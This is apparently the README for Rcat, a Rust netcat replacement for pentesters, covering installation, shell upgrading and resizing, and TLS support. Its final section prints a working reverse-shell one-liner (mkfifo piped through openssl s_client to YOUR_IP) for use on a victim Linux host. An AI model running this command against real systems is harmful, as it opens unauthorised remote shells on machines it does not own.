<div align="center">

# Rcat
### A better netcat for hackers

</div>

### Overview

__Rcat__ is a modern _netcat_ written in Rust, packed with features for hackers.

<img src="images/rcat_curl.svg">

Here we listen on port `tcp:9001`, and receive an HTTP request made with `curl`.

### Install
#### Static binaries

We provide binaries for:
* [Linux amd64](https://github.com/0xfalafel/rcat/releases/latest/download/rcat_amd64)
* [Linux arm64](https://github.com/0xfalafel/rcat/releases/latest/download/rcat_arm64)
* [Windows](https://github.com/0xfalafel/rcat/releases/latest/download/rcat.exe) (amd64)
* [Mac OS](https://github.com/0xfalafel/rcat/releases/latest/download/rcat_macos) (arm64)

#### Build from source

```bash
git clone git@github.com:0xfalafel/rcat.git
cargo install --path .
```

### Features

#### Familiar syntax

Rcat keeps a syntax similar to _netcat_. You already know how to use it.

* `-l` to listen.
* `-u` for udp.

#### Shell Upgrade

Rcat can __upgrade your shells__ with the `--pwn` option.  
With an upgraded shell, you can use shortcuts like `Ctrl + C`, clear the terminal with `clear` or `Ctrl + L`, etc. It's like having an SSH connection.
There is no need to [type 7 commands](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) each time you obtain a reverse shell.

<img src="images/rcat_pwn.svg">

> Here the commands `stty rows 22 cols 65` and `export TERM=xterm-256colors` are typed automatically when the connection is received.

#### Shell Upgrade Windows

Windows is also supported by the shell upgrade feature.

<img src="images/rcat_win.svg">

#### Resize

Unless you use the `-R` option, the remote terminal will automatically be resized when you change the size of your terminal.  
> (Rcat sends a _SIGTSTP_, resizes the terminal with the `stty` command then uses `fg` to restore the application running.)

<img src="images/rcat_resize.webp">

> In this clip we run `htop` on the victim machine, and the reverse shell is automatically resized.

#### TLS support

Support of __TLS__ with `-t` or `--tls`.  
Here we do an HTTPS request. We use `-t` to establish a _TLS connection_, and `-c` to replace newlines (`\n`) with _CRLF_ newlines (`\r\n`) as required by the HTTP protocol.

<img src="images/rcat_tls.svg">

  
## Encrypted Reverse shell

With TLS support, let's see how we can do an __TLS encrypted reverse shell__. Without installing any new tools on the victim.

If you have a signed certificate (with [let's encrypt](https://certbot.eff.org/instructions) for example), you can use the `--key` and `--cert` options to use it.

### TLS listener

But for now let's use a self-signed certificate:

```bash
> rcat -l 1337 --self-signed --pwn
Listening on 0.0.0.0:1337 (tcp/tls) with a self-signed certificate
```

### Reverse Shell

On a __linux__ target, you can use the following command to __connect to your listener__.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| openssl s_client -connect YOUR_IP:1337 >/tmp/f
```

## Acknowledgment

The _shell upgrade_ feature for _windows_ is taken from the [ConPtyShell](https://github.com/antonioCoco/ConPtyShell/) project.
